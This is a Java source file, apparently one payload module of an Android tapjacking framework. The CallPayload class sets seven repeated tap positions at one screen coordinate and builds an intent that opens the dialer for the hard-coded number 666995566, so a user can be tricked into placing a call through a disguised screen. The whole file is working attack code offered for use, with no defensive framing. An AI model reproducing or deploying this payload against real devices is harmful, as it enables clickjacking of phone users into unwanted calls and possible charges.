package com.tapjacking.payloads;

import com.tapjacking.framework.FrameworkPayload;
import android.content.Intent;
import android.graphics.Point;
import android.net.Uri;

public class CallPayload extends FrameworkPayload {

	public CallPayload() {
		for(int i=0; i<=6; i++)
			positions.add(new Point(170, 610));
	}

	@Override
	public Intent getIntent() {
		Intent intent = new Intent(Intent.ACTION_VIEW);
		intent.setData(Uri.parse("tel://666995566"));
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		return intent;
	}

	@Override
	public int getSleep() {
		return 1000;
	}
}
